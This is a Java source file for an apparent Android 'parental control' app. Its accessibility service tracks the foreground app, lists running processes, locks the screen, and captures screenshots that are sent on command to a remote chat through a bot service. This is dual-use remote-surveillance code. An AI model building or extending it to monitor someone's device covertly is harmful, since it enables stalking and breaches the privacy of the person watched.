package com.parentcontrol;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;
import java.io.FileOutputStream;

public class StatusAccessibilityService extends AccessibilityService {

    private static StatusAccessibilityService instance;
    private static BotService botService;
    private String lastActiveApp = "Не определено";

    public static StatusAccessibilityService getInstance() { return instance; }
    public static void setBotService(BotService s) { botService = s; }
    public String getCurrentApp() { return lastActiveApp; }
    public String getActiveApp() { return lastActiveApp; }

    @Override
    public void onServiceConnected() {
        instance = this;
        AppLogger.log("✅ AccessibilityService подключён");
        // Если BotService уже запущен - связываем их
        if (BotService.getInstance() != null) {
            botService = BotService.getInstance();
            AppLogger.log("✅ BotService найден и подключён");
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null) {
                lastActiveApp = event.getPackageName().toString();
            }
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    public void takeScreenshot(String chatId) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
                getMainExecutor(),
                new TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(ScreenshotResult screenshot) {
                        try {
                            android.hardware.HardwareBuffer hwBuffer = screenshot.getHardwareBuffer();
                            if (hwBuffer == null) {
                                if (botService != null) botService.sendTextTo(chatId, "Скриншот: hwBuffer null");
                                return;
                            }
                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(hwBuffer, screenshot.getColorSpace());
                            if (bitmap == null) {
                                if (botService != null) botService.sendTextTo(chatId, "Скриншот: bitmap null");
                                hwBuffer.close();
                                return;
                            }
                            // Конвертируем из hardware в software bitmap
                            Bitmap soft = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                            hwBuffer.close();
                            if (soft == null) {
                                if (botService != null) botService.sendTextTo(chatId, "Скриншот: soft bitmap null");
                                return;
                            }
                            // Используем кеш BotService чтобы файл был доступен
                            File dir = botService != null ? botService.getCacheDir() : getCacheDir();
                            File file = new File(dir, "screenshot.png");
                            FileOutputStream fos = new FileOutputStream(file);
                            soft.compress(Bitmap.CompressFormat.PNG, 90, fos);
                            fos.flush();
                            fos.close();
                            soft.recycle();
                            AppLogger.log("Скриншот сохранён: " + file.length() + " байт");
                            final File finalFile = file;
                            final BotService bs = botService != null ? botService : BotService.getInstance();
                            if (bs != null) {
                                // Отправляем в фоновом потоке - нельзя делать сеть в Main потоке!
                                bs.getWorkers().execute(() -> bs.sendPhoto(finalFile, chatId));
                            } else {
                                AppLogger.log("BotService недоступен");
                            }
                        } catch (Exception e) {
                            AppLogger.log("Ошибка скриншота: " + e.getMessage());
                            if (botService != null) botService.sendTextTo(chatId, "Ошибка скриншота: " + e.getMessage());
                        }
                    }
                    @Override
                    public void onFailure(int errorCode) {
                        AppLogger.log("Скриншот не удался: код " + errorCode);
                        if (botService != null) botService.sendTextTo(chatId, "Скриншот не удался: код " + errorCode);
                    }
                });
        } else {
            performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
            if (botService != null) botService.sendTextTo(chatId, "Скриншот сделан (старый Android)");
        }
    }

    public void lockScreen() {
        performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
    }

    public String getRunningApps() {
        try {
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            java.util.List<android.app.ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
            StringBuilder sb = new StringBuilder();
            if (procs != null) {
                for (android.app.ActivityManager.RunningAppProcessInfo p : procs) {
                    if (p.importance <= android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE) {
                        sb.append(p.processName).append("\n");
                    }
                }
            }
            return sb.length() > 0 ? sb.toString().trim() : "Нет активных приложений";
        } catch (Exception e) {
            return "Ошибка: " + e.getMessage();
        }
    }
}
